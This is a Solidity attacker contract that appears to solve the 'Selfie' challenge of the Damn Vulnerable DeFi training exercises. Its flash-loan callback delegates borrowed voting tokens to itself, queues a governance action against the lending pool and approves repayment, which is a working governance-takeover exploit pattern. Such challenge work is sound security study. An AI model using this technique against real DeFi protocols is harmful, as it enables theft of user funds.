// SPDX-License-Identifier: MIT
pragma solidity =0.8.25;

import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC20} from "@openzeppelin/contracts/interfaces/IERC20.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract Attacker {

    SimpleGovernance immutable governance;
    SelfiePool immutable pool;
    address public recovery;
    address player;

    constructor(SimpleGovernance _governance, SelfiePool _pool, address _recovery) {
        governance = _governance;
        pool = _pool;
        recovery = _recovery;
        player = msg.sender;
    }

    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    function onFlashLoan(
        address initiator,
        address token,
        uint256 amount,
        uint256 fee,
        bytes calldata data
    ) external returns (bytes32) {
        DamnValuableVotes(token).delegate(address(this));
        governance.queueAction(address(pool), 0, data);
        // console.log("balance", DamnValuableVotes(token).balanceOf(address(this)));
        DamnValuableVotes(token).approve(address(pool), amount);
        // console.log(address(governance));
        
        return CALLBACK_SUCCESS;
    }

    

}